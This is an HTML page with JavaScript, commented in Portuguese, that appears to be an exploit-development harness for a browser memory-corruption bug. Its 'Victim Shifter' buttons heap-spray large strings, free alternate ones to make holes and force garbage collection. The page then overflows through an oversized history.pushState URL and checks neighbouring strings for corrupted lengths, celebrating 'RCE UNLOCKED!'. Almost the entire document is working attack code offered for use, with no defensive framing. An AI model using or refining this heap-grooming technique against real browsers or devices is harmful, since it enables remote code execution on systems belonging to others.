<!DOCTYPE html>
<html>
<head>
    <title>Victim Shifter (1MB Tuning)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-bottom: 10px; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #0f0; color: #000; font-weight: bold; font-size: 1.6em; padding: 15px; border: 3px solid white; }
        .hit { color: yellow; font-weight: bold; }
    </style>
</head>
<body>

    <h1>Victim Shifter</h1>
    <p>Exploit fixo em 709520. Ajustando o tamanho das vítimas para alinhar o Header.</p>

    <button onclick="startShift(0)">1. Vítima Padrão (Reference)</button>
    <button onclick="startShift(8)">2. Vítima -8 bytes</button>
    <button onclick="startShift(16)">3. Vítima -16 bytes</button>
    <button onclick="startShift(24)">4. Vítima -24 bytes</button>
    <button onclick="startShift(32)">5. Vítima -32 bytes</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        // O PONTO ONDE ACERTAMOS DADOS (FIXO)
        const EXPLOIT_OFFSET = 709520; 
        const OVERFLOW_AMT = 1024 * 64; 

        // Tamanho base que funcionou (1MB)
        const BASE_TARGET_SIZE = 1024 * 1024; 
        const BASE_PAYLOAD_SIZE = BASE_TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : (type === 'hit' ? 'class="hit"' : '');
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startShift(shiftAmount) {
            // Ajustamos o tamanho da vítima
            let currentPayloadSize = BASE_PAYLOAD_SIZE - shiftAmount;
            
            log(`------------------------------------------`);
            log(`TESTANDO VÍTIMAS DE TAMANHO: 1MB - ${shiftAmount} bytes`);
            
            // 1. Limpeza
            victims = [];
            await forceGC();

            try {
                // 2. SPRAY COM TAMANHO AJUSTADO
                let rawBuffer = new Uint8Array(currentPayloadSize);
                rawBuffer.fill(0x42); 
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                // Spray
                for(let i=0; i<80; i++) {
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // Buracos
                for(let i=0; i<80; i+=2) victims[i] = null;
                await forceGC();

                // 3. EXPLOIT (SEMPRE IGUAL)
                log("Disparando Overflow (709520)...");
                setTimeout(() => {
                    try {
                        let buffer = "A".repeat(EXPLOIT_OFFSET);
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "shifter", "/" + buffer);

                        checkResult(currentPayloadSize, shiftAmount);

                    } catch (e) {
                        log("Erro JS: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro memória: " + e.message);
            }
        }

        function checkResult(expectedLen, shift) {
            let found = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // CASO 1: LENGTH (VITÓRIA)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido com Shift -${shift}!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert("RCE UNLOCKED!");
                        found = true;
                        break;
                    }

                    // CASO 2: DADOS (QUASE)
                    if (msg.charCodeAt(0) === 1) {
                        log(`Shift -${shift}: Ainda acertando DADOS. Tente mais shift.`, 'hit');
                        found = true;
                        break;
                    }
                } catch(e) {}
            }
            if(!found) log(`Shift -${shift}: Nada atingido.`);
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 400));
        }
    </script>
</body>
</html>
